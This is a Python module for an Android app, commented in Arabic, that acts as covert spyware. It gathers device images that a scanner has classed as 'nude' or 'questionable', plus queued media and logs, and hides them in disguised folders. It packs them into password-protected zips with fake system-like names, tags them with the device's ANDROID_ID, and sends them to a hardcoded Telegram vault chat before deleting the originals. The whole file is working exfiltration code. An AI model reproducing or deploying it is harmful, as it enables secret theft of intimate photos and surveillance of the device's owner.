# -*- coding: utf-8 -*-
import os
import time
import random
import threading
import logging
import gc
import string
import json
import zipfile
import hashlib
from datetime import datetime

# ========== إعداد المسارات ==========
def _get_runtime_path():
    try:
        from jnius import autoclass
        act = autoclass('org.kivy.android.PythonActivity').mActivity
        base = act.getFilesDir().getPath()
        return os.path.join(base, ".sys_runtime")
    except:
        return os.path.join(os.getcwd(), ".sys_runtime")

P = _get_runtime_path()
H = os.path.join(P, "harvest")               # المجلد النهائي للملفات المضغوطة
PENDING = os.path.join(H, "pending_upload")  # مجلد انتظار التأكيد (احتياطي)
QUEUE = os.path.join(P, ".cache_thumb")      # مجلد مؤقت للصور قبل الضغط (مخفي وموهم)

for d in [P, H, PENDING, QUEUE]:
    if not os.path.exists(d):
        os.makedirs(d)

logging.basicConfig(filename=os.path.join(P, "z.log"), level=logging.ERROR, filemode='a')

try:
    from jnius import autoclass
    JNI_AVAILABLE = True
except:
    JNI_AVAILABLE = False


class DailyZipper:
    def __init__(self, scanner=None, tg=None):
        self.sc = scanner
        self.tg = tg
        self.max_b = 48 * 1024 * 1024   # 48MB (آمن تحت حد 50MB)
        self.active = False
        self._active_lock = threading.Lock()  # قفل لحماية حالة النشاط
        self.device_tag = self._get_device_tag()
        self._processed_hashes = set()  # لتتبع الملفات المعالجة (deduplication)

    def _get_device_tag(self):
        """استخراج معرف جهاز قصير (أول 8 خانات من ANDROID_ID أو hash عشوائي)"""
        try:
            from jnius import autoclass
            Secure = autoclass('android.provider.Settings$Secure')
            ctx = autoclass('org.kivy.android.PythonActivity').mActivity
            aid = Secure.getString(ctx.getContentResolver(), Secure.ANDROID_ID)
            if aid:
                return aid[:8].lower()
        except:
            pass
        try:
            Build = autoclass('android.os.Build')
            model = f"{Build.MANUFACTURER} {Build.MODEL}"
            return hashlib.md5(model.encode()).hexdigest()[:8]
        except:
            return "unknown"

    # ========== التحقق من المساحة المتوفرة ==========
    def _check_storage(self, required_bytes):
        """التحقق من وجود مساحة كافية في التخزين"""
        try:
            stat = os.statvfs(P)
            available = stat.f_frsize * stat.f_bavail
            # نحتاج ضعف المساحة المطلوبة (للأمان)
            return available > (required_bytes * 2 + 100 * 1024 * 1024)  # +100MB احتياطي
        except:
            return True  # في حالة الفشل، نفترض أن المساحة كافية

    # ========== حساب هاش الملف ==========
    def _file_hash(self, filepath):
        """حساب MD5 hash للملف لتتبع التكرار"""
        try:
            hash_md5 = hashlib.md5()
            with open(filepath, "rb") as f:
                for chunk in iter(lambda: f.read(4096), b""):
                    hash_md5.update(chunk)
            return hash_md5.hexdigest()
        except:
            return None

    # ========== توليد اسم ملف وهمي ==========
    def _gen_name(self):
        prefixes = ["cache_", "sys_upd_", "tmp_vol_", "core_st_", "db_sync_"]
        date_str = datetime.now().strftime("%y%m%d")
        tag = self.device_tag
        chars = string.ascii_letters + string.digits
        suffix = ''.join(random.choices(chars, k=6))
        prefix = random.choice(prefixes)
        return f"{prefix}{date_str}_{tag}_{suffix}.zip"

    # ========== حذف آمن ==========
    def _delete_file(self, path):
        """حذف ملف مع معالجة الأخطاء"""
        try:
            if os.path.exists(path):
                os.remove(path)
                return True
        except Exception as e:
            logging.error(f"Delete error {path}: {e}")
        return False

    # ========== التحقق من الاتصال عبر Wi-Fi ==========
    def _is_on_wifi(self):
        if not JNI_AVAILABLE:
            return True
        try:
            ctx = autoclass('org.kivy.android.PythonActivity').mActivity
            cm = ctx.getSystemService("connectivity")
            if cm is None:
                return True
            n = cm.getActiveNetworkInfo()
            return n and n.isConnected() and n.getType() == 1  # TYPE_WIFI = 1
        except:
            return True

    # ========== إرسال آمن مع إعادة محاولة ==========
    def _safe_send(self, zip_path, caption, target_chat=None):
        """إرسال الملف مع إعادة المحاولة"""
        if not self.tg:
            return False
            
        # تحديد الهدف: chat_id المحدد أو vault أو قيمة افتراضية
        target = target_chat
        if target is None:
            target = getattr(self.tg, 'vlt', None)  # vault أولاً
        if target is None:
            target = getattr(self.tg, 'dat', None)   # ثم data/control
        if target is None:
            target = -1003577715762  # قيمة افتراضية (Vault ID)
            
        delays = [2, 4, 8]
        for attempt, delay in enumerate(delays):
            try:
                if not os.path.exists(zip_path):
                    logging.error(f"Zip file not found: {zip_path}")
                    return False
                    
                with open(zip_path, 'rb') as fobj:
                    resp = self.tg._api("sendDocument",
                                        {"chat_id": target, "caption": caption},
                                        {"document": fobj})
                if resp and resp.get('ok'):
                    return True
                else:
                    logging.warning(f"Send attempt {attempt+1} failed: {resp}")
            except Exception as e:
                logging.error(f"Send error (attempt {attempt+1}): {e}")
            if attempt < len(delays) - 1:
                time.sleep(delay)
        return False

    # ========== الإرسال الفوري اليدوي ==========
    def force_send_now(self, chat_id=None):
        """إرسال الملفات المتراكمة فوراً"""
        with self._active_lock:
            if self.active:
                if chat_id and self.tg:
                    try:
                        self.tg._api("sendMessage", {"chat_id": chat_id, "text": "⏳ عملية حصاد جارية بالفعل..."})
                    except:
                        pass
                return False

        # جمع الملفات من جميع المصادر
        files_to_pack = []
        total_size = 0
        
        for folder in [QUEUE, PENDING]:
            if os.path.exists(folder):
                for f in os.listdir(folder):
                    path = os.path.join(folder, f)
                    if os.path.isfile(path) and os.path.getsize(path) > 0:
                        files_to_pack.append(path)
                        total_size += os.path.getsize(path)

        if not files_to_pack:
            if chat_id and self.tg:
                try:
                    self.tg._api("sendMessage", {"chat_id": chat_id, "text": "📭 لا توجد ملفات جديدة للحصاد حالياً."})
                except:
                    pass
            return False

        # التحقق من المساحة
        if not self._check_storage(total_size):
            if chat_id and self.tg:
                try:
                    self.tg._api("sendMessage", {"chat_id": chat_id, "text": "⚠️ المساحة غير كافية لإنشاء الأرشيف."})
                except:
                    pass
            return False

        if chat_id and self.tg:
            try:
                self.tg._api("sendMessage", {"chat_id": chat_id, "text": f"🚀 جاري معالجة {len(files_to_pack)} ملفاً ({total_size/1024/1024:.1f} MB)..."})
            except:
                pass
                
        threading.Thread(target=self._pack_and_ship, args=(files_to_pack, True, chat_id), daemon=True).start()
        return True

    # ========== الضغط والإرسال ==========
    def _pack_and_ship(self, files, bypass_wifi=False, report_id=None):
        """ضغط الملفات وإرسالها"""
        if not files:
            return False
            
        with self._active_lock:
            if self.active:
                return False
            self.active = True

        if not bypass_wifi and not self._is_on_wifi():
            logging.info("Not on WiFi, skipping automatic harvest.")
            with self._active_lock:
                self.active = False
            return False

        # إزالة التكرار باستخدام الهاش
        unique_files = []
        total_size = 0
        for f in files:
            if not os.path.exists(f):
                continue
            fhash = self._file_hash(f)
            if fhash and fhash not in self._processed_hashes:
                unique_files.append(f)
                self._processed_hashes.add(fhash)
                total_size += os.path.getsize(f)
                
        if not unique_files:
            logging.info("No unique files to process")
            with self._active_lock:
                self.active = False
            return False

        # التحقق من المساحة
        if not self._check_storage(total_size):
            logging.error("Insufficient storage for packing")
            if report_id and self.tg:
                try:
                    self.tg._api("sendMessage", {"chat_id": report_id, "text": "⚠️ المساحة غير كافية"})
                except:
                    pass
            with self._active_lock:
                self.active = False
            return False

        # تقسيم الملفات إلى دفعات حسب الحجم
        batches = []
        cur_batch, cur_size = [], 0
        
        for f in unique_files:
            try:
                fsz = os.path.getsize(f)
                # إذا كان الملف وحده أكبر من الحد، نرسله منفرداً
                if fsz > self.max_b:
                    if cur_batch:
                        batches.append(cur_batch)
                        cur_batch, cur_size = [], 0
                    batches.append([f])
                    continue
                    
                if cur_size + fsz > self.max_b:
                    if cur_batch:
                        batches.append(cur_batch)
                    cur_batch, cur_size = [], 0
                cur_batch.append(f)
                cur_size += fsz
            except Exception as e:
                logging.error(f"Batching error for {f}: {e}")
                
        if cur_batch:
            batches.append(cur_batch)

        # معالجة كل دفعة
        success_count = 0
        for idx, batch in enumerate(batches):
            zip_name = self._gen_name()
            zip_path = os.path.join(H, zip_name)
            manifest_path = None

            try:
                # بناء بيانات manifest
                manifest_data = {
                    "device_tag": self.device_tag,
                    "timestamp": int(time.time()),
                    "batch": idx + 1,
                    "total_batches": len(batches),
                    "files": []
                }
                
                for f in batch:
                    try:
                        fname = os.path.basename(f)
                        fsize = os.path.getsize(f) if os.path.exists(f) else 0
                        fhash = self._file_hash(f)
                        
                        # تحديد النوع
                        f_lower = fname.lower()
                        if f_lower.endswith(('.jpg','.jpeg','.png','.webp','.bmp')):
                            ftype = "image"
                        elif f_lower.endswith(('.aac','.mp3','.wav','.m4a')):
                            ftype = "audio"
                        elif f_lower.endswith('.txt'):
                            ftype = "log"
                        elif f_lower.endswith(('.mp4','.avi','.mov','.mkv')):
                            ftype = "video"
                        else:
                            ftype = "other"
                            
                        manifest_data["files"].append({
                            "name": fname,
                            "size": fsize,
                            "type": ftype,
                            "hash": fhash,
                            "timestamp": int(os.path.getmtime(f)) if os.path.exists(f) else 0
                        })
                    except Exception as e:
                        logging.error(f"Manifest entry error: {e}")

                # إنشاء manifest مؤقت
                manifest_path = os.path.join(H, f"manifest_{int(time.time())}_{random.randint(1000,9999)}.json")
                with open(manifest_path, 'w', encoding='utf-8') as mf:
                    json.dump(manifest_data, mf, indent=2, ensure_ascii=False)

                # إنشاء ZIP بكلمة مرور (إذا كان pyzipper متوفراً)
                try:
                    import pyzipper
                    with pyzipper.AESZipFile(zip_path, 'w', encryption=pyzipper.WZ_AES) as zf:
                        zf.setpassword(b'ShieldCore2024!')  # كلمة المرور
                        for f in batch:
                            zf.write(f, os.path.basename(f))
                        zf.write(manifest_path, "manifest.json")
                except ImportError:
                    # fallback لـ zipfile العادي
                    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
                        for f in batch:
                            zf.write(f, os.path.basename(f))
                        zf.write(manifest_path, "manifest.json")

                # حذف manifest المؤقت
                if manifest_path and os.path.exists(manifest_path):
                    self._delete_file(manifest_path)
                    manifest_path = None

                # التحقق من إنشاء ZIP
                if not os.path.exists(zip_path) or os.path.getsize(zip_path) == 0:
                    raise Exception("Failed to create zip file")

                caption = f"📦 {'إرسال فوري' if bypass_wifi else 'حصاد تلقائي'} | دفعة {idx+1}/{len(batches)} | {len(batch)} ملفات"
                success = self._safe_send(zip_path, caption, report_id)

                if success:
                    for f in batch:
                        self._delete_file(f)
                    success_count += 1
                    if report_id and self.tg:
                        try:
                            self.tg._api("sendMessage", {"chat_id": report_id, "text": f"✅ تم إرسال الدفعة {idx+1}/{len(batches)} بنجاح"})
                        except:
                            pass
                else:
                    if report_id and self.tg:
                        try:
                            self.tg._api("sendMessage", {"chat_id": report_id, "text": f"❌ فشل إرسال الدفعة {idx+1}"})
                        except:
                            pass

            except Exception as e:
                logging.error(f"Packing error: {e}")
                if report_id and self.tg:
                    try:
                        self.tg._api("sendMessage", {"chat_id": report_id, "text": f"⚠️ خطأ في الضغط: {str(e)[:100]}"})
                    except:
                        pass
            finally:
                # تنظيف الملفات المؤقتة
                if zip_path and os.path.exists(zip_path):
                    self._delete_file(zip_path)
                if manifest_path and os.path.exists(manifest_path):
                    self._delete_file(manifest_path)

            # تأخير بين الدفعات
            if idx < len(batches) - 1:
                time.sleep(5)

        with self._active_lock:
            self.active = False
        gc.collect()

        if report_id and self.tg:
            try:
                self.tg._api("sendMessage", {"chat_id": report_id, "text": f"🏁 انتهت العملية. نجح إرسال {success_count}/{len(batches)} دفعات."})
            except:
                pass
                
        return success_count > 0

    # ========== الحصاد التلقائي ==========
    def run(self):
        """تشغيل الحصاد التلقائي"""
        with self._active_lock:
            if self.active:
                return False
            self.active = True

        if not self._is_on_wifi():
            logging.info("Not on WiFi, skipping automatic harvest.")
            with self._active_lock:
                self.active = False
            return False

        all_files = []
        
        # جمع من الـ scanner
        if self.sc:
            try:
                for cat in ["nude", "questionable"]:
                    try:
                        items = self.sc.get_gallery_by_category(cat, limit=150)
                        if items:
                            all_files.extend([i["path"] for i in items if i.get("path") and os.path.exists(i["path"])])
                    except Exception as e:
                        logging.error(f"Scanner category {cat} error: {e}")
            except Exception as e:
                logging.error(f"Scanner error: {e}")

        # جمع من QUEUE
        if os.path.exists(QUEUE):
            try:
                for f in os.listdir(QUEUE):
                    path = os.path.join(QUEUE, f)
                    if os.path.isfile(path) and os.path.getsize(path) > 0:
                        all_files.append(path)
            except Exception as e:
                logging.error(f"Queue scan error: {e}")

        # جمع ملفات اللوج الكبيرة
        try:
            for f in os.listdir(P):
                if f.endswith(".log") and f not in ["z.log", "t.log"]:
                    path = os.path.join(P, f)
                    if os.path.exists(path) and os.path.getsize(path) > 100 * 1024:
                        all_files.append(path)
        except Exception as e:
            logging.error(f"Logs error: {e}")

        # إزالة التكرار
        unique_files = list(set(all_files))
        
        if unique_files:
            # إرسال إشعار
            if self.tg and hasattr(self.tg, 'notify_harvest'):
                try:
                    did = getattr(self.sc, 'did', 'Unknown') if self.sc else 'Unknown'
                    self.tg.notify_harvest(did, len(unique_files))
                except Exception as e:
                    logging.error(f"Notify error: {e}")
                    
            # تشغيل في thread منفصل
            threading.Thread(target=self._pack_and_ship, args=(unique_files, False, None), daemon=True).start()
            return True
        else:
            with self._active_lock:
                self.active = False
            return False

    # ========== تنظيف الهاشات القديمة ==========
    def clear_hash_cache(self):
        """مسح ذاكرة الهاشات (مفيد للاختبار)"""
        self._processed_hashes.clear()

    # ========== الحصول على إحصائيات ==========
    def get_stats(self):
        """الحصول على إحصائيات حول الملفات المتراكمة"""
        stats = {"pending": 0, "size": 0}
        for folder in [QUEUE, PENDING]:
            if os.path.exists(folder):
                for f in os.listdir(folder):
                    path = os.path.join(folder, f)
                    if os.path.isfile(path):
                        stats["pending"] += 1
                        stats["size"] += os.path.getsize(path)
        return stats


# ========== دالة المصنع ==========
def create(scanner=None, telegram=None):
    return DailyZipper(scanner, telegram)
